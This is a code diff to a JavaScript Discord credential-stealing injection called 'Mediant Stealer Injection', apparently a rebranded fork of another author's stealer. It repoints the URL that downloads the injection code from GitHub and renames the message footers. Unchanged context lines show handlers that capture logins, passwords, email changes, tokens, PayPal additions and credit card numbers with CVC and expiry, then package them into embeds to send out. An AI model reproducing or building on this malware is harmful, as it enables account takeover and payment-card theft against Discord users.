@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Mediant Injection', 
   embed_icon: 'https://media.discordapp.net/attachments/1054752436415385700/1132710459519275089/IMG_20230723_000404.png?width=404&height=405'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Themediant/lagnewalisui/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/index.js', 
   /**
    
    **/
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: '🎉・Mediant Stealer Injection',
         },
       },
     ],
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉A Mediant Project',
+          text: '🎉・Mediant Stealer Injection',
         },
       },
     ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・A Mediant Project',
+          text: '🎉・Mediant Stealer Injection',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・A Mediant Project',
+          text: '🎉・Mediant Stealer Injection',
         },
       },
     ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・A Mediant Project',
+          text: '🎉・Mediant Stealer Injection',
         },
       },
     ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・A Mediant Project',
+          text: '🎉・Mediant Stealer Injection',
         },
       },
     ],
